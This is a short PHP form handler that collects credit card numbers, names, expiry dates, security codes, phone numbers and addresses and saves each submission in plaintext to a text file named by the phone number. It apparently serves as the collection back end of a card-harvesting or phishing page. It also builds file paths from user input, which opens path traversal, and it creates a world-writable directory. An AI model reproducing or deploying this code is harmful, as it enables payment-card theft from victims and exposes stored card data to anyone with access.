<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $card_number = htmlspecialchars($_POST['card_number']);
    $name = htmlspecialchars($_POST['name']);
    $expiration_date = htmlspecialchars($_POST['expiration_date']);
    $security_code = htmlspecialchars($_POST['security_code']);
    $phone = htmlspecialchars($_POST['phone']);
    $address = htmlspecialchars($_POST['address']);

    $data = "Credit Card Number: $card_number\n";
    $data .= "Name on Card: $name\n";
    $data .= "Expiration Date: $expiration_date\n";
    $data .= "Security Code: $security_code\n";
    $data .= "Phone Number: $phone\n";
    $data .= "Address: $address\n";

    $filename = 'submissions/' . $phone . '.txt';

    if (!is_dir('submissions')) {
        mkdir('submissions', 0777, true);
    }

    file_put_contents($filename, $data);

    echo 'Form submitted successfully!';
} else {
    echo 'Invalid request method!';
}
?>
